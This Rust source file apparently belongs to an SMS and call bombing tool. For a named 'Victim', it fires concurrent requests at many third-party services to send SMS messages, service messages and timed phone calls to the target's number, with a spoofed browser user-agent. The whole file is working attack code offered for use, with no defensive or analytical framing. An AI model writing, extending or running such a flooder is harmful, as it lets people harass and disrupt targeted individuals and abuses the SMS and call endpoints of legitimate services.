use crate::services::{
    construct_call_services_list, construct_services_list, BodyType, Service, ServiceType, Victim,
};
use reqwest::{Client, Method};
use std::time::Duration;

const CALL_DELAY: u8 = 15;

/// Вы бы знали как мне стыдно за такой колхозинг, но надеюсь это на время
pub async fn send(victim: Victim) -> Result<(), Box<dyn std::error::Error>> {
    let mut s = Vec::new();

    let services = construct_services_list(victim.clone());
    for service in services {
        let t = tokio::spawn(async move {
            send_single(service).await.expect("");
        });
        s.push(t);
    }

    let services = construct_call_services_list(victim);
    let t = tokio::spawn(async move {
        for service in services {
            for i in 0..CALL_DELAY {
                println!("Waiting {} seconds before calling", CALL_DELAY - i);

                tokio::time::sleep(Duration::from_secs(1)).await;
            }
            println!();

            send_single(service.clone()).await.expect("");
        }
    });
    s.push(t);

    for i in s {
        i.await?;
    }

    Ok(())
}

async fn send_single(service: Service) -> Result<(), Box<dyn std::error::Error>> {
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
        .cookie_store(true)
        .default_headers(service.headers)
        .build()
        .expect("");

    match service.service_type {
        ServiceType::Sms => println!("Sending SMS {}", service.name),
        ServiceType::Call => println!("Calling {}", service.name),
        ServiceType::ServiceMessage => println!("Sending service SMS {}", service.name),
    }

    let mut res;
    match service.method {
        Method::GET => res = client.get(service.url),
        Method::POST => res = client.post(service.url),
        _ => panic!("Unsupported method"),
    }
    match service.body_type {
        BodyType::JSON => res = res.json(&service.body),
        BodyType::Form => res = res.form(&service.body),
    }

    let res = res.send().await?;
    println!("{}: {}", res.status(), res.text().await?);
    println!("{} sent\n", service.name);

    Ok(())
}
